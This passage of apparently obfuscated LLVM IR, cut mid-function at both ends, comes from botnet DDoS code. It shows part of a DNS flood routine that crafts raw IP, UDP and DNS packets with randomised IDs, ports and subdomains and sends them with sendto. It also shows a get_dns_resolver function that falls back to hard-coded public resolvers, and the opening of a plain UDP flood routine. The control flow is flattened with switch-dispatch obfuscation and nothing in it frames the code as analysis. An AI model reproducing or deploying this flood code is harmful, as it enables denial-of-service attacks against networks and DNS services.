  %263 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %262, i32 0, i32 1
  store i16 %261, i16* %263, align 2
  store i32 -514272813, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = add nsw i32 %265, 1
  store i32 %266, i32* %9, align 4
  store i32 2125365468, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 1461391476, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 798050337, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i32, i32* %9, align 4
  %271 = load i8, i8* %5, align 1
  %272 = zext i8 %271 to i32
  %273 = icmp slt i32 %270, %272
  %274 = select i1 %273, i32 759624389, i32 -400920944
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8**, i8*** %11, align 8
  %277 = load i32, i32* %9, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8*, i8** %276, i64 %278
  %280 = load i8*, i8** %279, align 8
  store i8* %280, i8** %32, align 8
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to %struct.iphdr*
  store %struct.iphdr* %282, %struct.iphdr** %33, align 8
  %283 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i64 1
  %285 = bitcast %struct.iphdr* %284 to %struct.udphdr*
  store %struct.udphdr* %285, %struct.udphdr** %34, align 8
  %286 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i64 1
  %288 = bitcast %struct.udphdr* %287 to %struct.dnshdr*
  store %struct.dnshdr* %288, %struct.dnshdr** %35, align 8
  %289 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %290 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %289, i64 1
  %291 = bitcast %struct.dnshdr* %290 to i8*
  %292 = getelementptr inbounds i8, i8* %291, i64 1
  store i8* %292, i8** %36, align 8
  %293 = load i16, i16* %13, align 2
  %294 = zext i16 %293 to i32
  %295 = icmp eq i32 %294, 65535
  %296 = select i1 %295, i32 -1153578470, i32 -1761099864
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = call i32 @rand_next()
  %299 = and i32 %298, 65535
  %300 = trunc i32 %299 to i16
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 3
  store i16 %300, i16* %302, align 4
  store i32 -1761099864, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i16, i16* %16, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %305, 65535
  %307 = select i1 %306, i32 1473560009, i32 180713989
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 0
  store i16 %311, i16* %313, align 2
  store i32 180713989, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i16, i16* %17, align 2
  %316 = zext i16 %315 to i32
  %317 = icmp eq i32 %316, 65535
  %318 = select i1 %317, i32 1583529010, i32 -1455027947
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = call i32 @rand_next()
  %321 = and i32 %320, 65535
  %322 = trunc i32 %321 to i16
  %323 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  store i32 -1455027947, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i16, i16* %18, align 2
  %327 = zext i16 %326 to i32
  %328 = icmp eq i32 %327, 65535
  %329 = select i1 %328, i32 -1892864656, i32 787974731
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = call i32 @rand_next()
  %332 = and i32 %331, 65535
  %333 = trunc i32 %332 to i16
  %334 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %335 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %334, i32 0, i32 0
  store i16 %333, i16* %335, align 2
  store i32 787974731, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i8*, i8** %36, align 8
  %338 = load i8, i8* %19, align 1
  %339 = zext i8 %338 to i32
  call void @rand_alphastr(i8* %337, i32 %339)
  %340 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 7
  store i16 0, i16* %341, align 2
  %342 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %343 = bitcast %struct.iphdr* %342 to i16*
  %344 = call zeroext i16 @checksum_generic(i16* %343, i32 20)
  %345 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 7
  store i16 %344, i16* %346, align 2
  %347 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 3
  store i16 0, i16* %348, align 2
  %349 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %351 = bitcast %struct.udphdr* %350 to i8*
  %352 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 2
  %354 = load i16, i16* %353, align 2
  %355 = load i8, i8* %19, align 1
  %356 = zext i8 %355 to i64
  %357 = add i64 21, %356
  %358 = add i64 %357, 2
  %359 = load i32, i32* %21, align 4
  %360 = sext i32 %359 to i64
  %361 = add i64 %358, %360
  %362 = add i64 %361, 4
  %363 = trunc i64 %362 to i32
  %364 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %349, i8* %351, i16 zeroext %354, i32 %363)
  %365 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %366 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %365, i32 0, i32 3
  store i16 %364, i16* %366, align 2
  %367 = load i32, i32* %22, align 4
  %368 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 0
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %372, i32 0, i32 2
  %374 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %373, i32 0, i32 0
  store i32 %367, i32* %374, align 4
  %375 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %376 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %375, i32 0, i32 1
  %377 = load i16, i16* %376, align 2
  %378 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 0
  %383 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %382, i32 0, i32 1
  store i16 %377, i16* %383, align 2
  %384 = load i32, i32* %10, align 4
  %385 = load i8*, i8** %32, align 8
  %386 = load i8, i8* %19, align 1
  %387 = zext i8 %386 to i64
  %388 = add i64 41, %387
  %389 = add i64 %388, 2
  %390 = load i32, i32* %21, align 4
  %391 = sext i32 %390 to i64
  %392 = add i64 %389, %391
  %393 = add i64 %392, 4
  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %396 = load i32, i32* %9, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i64 @sendto(i32 %384, i8* %385, i64 %393, i32 16384, %struct.sockaddr* %402, i32 16)
  store i32 555770430, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i32, i32* %9, align 4
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %9, align 4
  store i32 798050337, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  store i32 1461391476, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %407, %404, %336, %330, %325, %319, %314, %308, %303, %297, %275, %269, %268, %267, %264, %249, %246, %245, %242, %232, %223, %218, %165, %161, %105, %99, %98, %95, %89, %88, %82, %81, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %.reg2mem8 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 30)
  %11 = call i8* @table_retrieve_val(i32 30, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 30)
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1628322323, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 1628322323, label %first
    i32 -134257881, label %16
    i32 1041407353, label %30
    i32 -1798756915, label %32
    i32 -1948138915, label %37
    i32 -397949582, label %45
    i32 1281350809, label %50
    i32 1212699366, label %55
    i32 -1032419199, label %56
    i32 1932814338, label %57
    i32 -711179465, label %58
    i32 934868413, label %63
    i32 515935125, label %68
    i32 1706377811, label %73
    i32 -1507805870, label %79
    i32 1586245243, label %93
    i32 -1507957886, label %94
    i32 -100044171, label %97
    i32 677532178, label %101
    i32 359038320, label %104
    i32 -989103409, label %105
    i32 1206904921, label %106
    i32 1432368796, label %NodeBlock5
    i32 -1139616788, label %NodeBlock3
    i32 -1661763756, label %LeafBlock1
    i32 -900071515, label %NodeBlock
    i32 -1089657239, label %LeafBlock
    i32 -1740602188, label %114
    i32 951475751, label %116
    i32 -1491379628, label %118
    i32 -101781543, label %120
    i32 1917394970, label %NewDefault
    i32 731113375, label %122
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sge i32 %.reload, 0
  %15 = select i1 %14, i32 -134257881, i32 1206904921
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %19 = call i64 @read(i32 %17, i8* %18, i64 2048)
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @close(i32 %21)
  call void @table_unlock_val(i8 zeroext 31)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %24 = load i32, i32* %3, align 4
  %25 = call i8* @table_retrieve_val(i32 31, i32* null)
  %26 = call i32 @util_stristr(i8* %23, i32 %24, i8* %25)
  store i32 %26, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 31)
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, -1
  %29 = select i1 %28, i32 1041407353, i32 -989103409
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %6, align 4
  store i32 -1798756915, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp slt i32 %33, %34
  %36 = select i1 %35, i32 -1948138915, i32 -100044171
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  store i8 %41, i8* %10, align 1
  %42 = load i8, i8* %8, align 1
  %43 = icmp ne i8 %42, 0
  %44 = select i1 %43, i32 -711179465, i32 -397949582
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 1212699366, i32 1281350809
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8, i8* %10, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 9
  %54 = select i1 %53, i32 1212699366, i32 -1032419199
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 -1507957886, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i8 1, i8* %8, align 1
  store i32 1932814338, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -711179465, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %10, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp ne i32 %60, 46
  %62 = select i1 %61, i32 934868413, i32 1706377811
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %10, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp slt i32 %65, 48
  %67 = select i1 %66, i32 -1507805870, i32 515935125
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %10, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp sgt i32 %70, 57
  %72 = select i1 %71, i32 -1507805870, i32 1706377811
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %3, align 4
  %76 = sub nsw i32 %75, 1
  %77 = icmp eq i32 %74, %76
  %78 = select i1 %77, i32 -1507805870, i32 1586245243
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %81 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %82 = load i32, i32* %4, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i32, i32* %6, align 4
  %86 = load i32, i32* %4, align 4
  %87 = sub nsw i32 %85, %86
  call void @util_memcpy(i8* %80, i8* %84, i32 %87)
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %4, align 4
  %90 = sub nsw i32 %88, %89
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  store i8 1, i8* %9, align 1
  store i32 -100044171, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1507957886, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %6, align 4
  store i32 -1798756915, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  %100 = select i1 %99, i32 677532178, i32 359038320
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  store i32 731113375, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 -989103409, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1206904921, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  store i32 %108, i32* %.reg2mem8
  store i32 1432368796, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem8
  %Pivot6 = icmp slt i32 %.reload13, 2
  %109 = select i1 %Pivot6, i32 -900071515, i32 -1139616788
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem8
  %Pivot4 = icmp slt i32 %.reload10, 3
  %110 = select i1 %Pivot4, i32 -1491379628, i32 -1661763756
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf2 = icmp eq i32 %.reload9, 3
  %111 = select i1 %SwitchLeaf2, i32 -101781543, i32 1917394970
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem8
  %Pivot = icmp slt i32 %.reload12, 1
  %112 = select i1 %Pivot, i32 -1089657239, i32 951475751
  store i32 %112, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf = icmp eq i32 %.reload11, 0
  %113 = select i1 %SwitchLeaf, i32 -1740602188, i32 1917394970
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = call i32 @htonl(i32 134744072) #7
  store i32 %115, i32* %1, align 4
  store i32 731113375, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @htonl(i32 1246898730) #7
  store i32 %117, i32* %1, align 4
  store i32 731113375, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @htonl(i32 1074151430) #7
  store i32 %119, i32* %1, align 4
  store i32 731113375, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = call i32 @htonl(i32 67240450) #7
  store i32 %121, i32* %1, align 4
  store i32 731113375, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 731113375, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %1, align 4
  ret i32 %123

loopEnd:                                          ; preds = %NewDefault, %120, %118, %116, %114, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %106, %105, %104, %101, %97, %94, %93, %79, %73, %68, %63, %58, %57, %56, %55, %50, %45, %37, %32, %30, %16, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -184420270, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -184420270, label %first
    i32 1762259385, label %52
    i32 -1074232329, label %55
    i32 -368357126, label %58
    i32 1892198835, label %59
    i32 366433295, label %65
    i32 -1430184009, label %75
    i32 1052832583, label %84
    i32 1689186546, label %93
    i32 -346229502, label %101
    i32 972873031, label %102
    i32 -567379793, label %120
    i32 2048204528, label %121
    i32 -821336937, label %131
    i32 -113840140, label %157
    i32 -1008603929, label %175
    i32 -424495847, label %176
    i32 399168071, label %177
    i32 2135984599, label %180
    i32 -1296206968, label %181
    i32 -1880441861, label %182
    i32 1683603767, label %188
    i32 -1527389534, label %197
    i32 547558927, label %201
    i32 1739988552, label %211
    i32 887714590, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 1762259385, i32 -1074232329
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 -368357126, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  store i32 -368357126, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1892198835, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 366433295, i32 2135984599
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 -1430184009, i32 1052832583
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 1689186546, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #7
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 1689186546, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 -346229502, i32 972873031
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #6
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 -567379793, i32 2048204528
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 2048204528, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
